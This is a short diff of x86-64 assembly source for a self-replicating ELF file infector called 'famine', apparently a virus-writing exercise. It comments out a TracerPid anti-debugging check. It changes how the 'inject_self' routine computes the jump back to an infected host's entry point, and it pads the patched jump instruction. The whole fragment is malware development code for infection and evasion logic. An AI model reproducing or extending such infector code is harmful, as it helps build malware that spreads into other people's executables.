@@ -38,7 +38,7 @@ loop .loop_status
 .check_trcr:
 add r12, 12
 cmp byte[r12], 0x30		;	CMP TRACERPID VAL WITH 0
-jne _exx_pop
+;jne _exx_pop
 
 
 
@@ -504,7 +504,7 @@ inject_self:
 ;	compute jump value
 	pop rdi ;   restore patched pheader 
 	mov rdx, [rdi + elf64_phdr.p_vaddr]
-	sub rdx, 9
+	sub rdx, RETURN_JUMP_VALUE_OFFSET
 	sub r14, rdx
 	sub r14, _end - _start
 	mov byte STACK(famine.jmp), JMP; jmp opcode
@@ -542,6 +542,7 @@ _exx_pop:
 POP
 _exx:
 jmp .exit	; at source execution of famine this will exit. when written to target jump is edited to host entry
+		db 00, 00, 00, 00, 00
 	.exit:
 		mov rax, _exit
 		mov rdi, 0
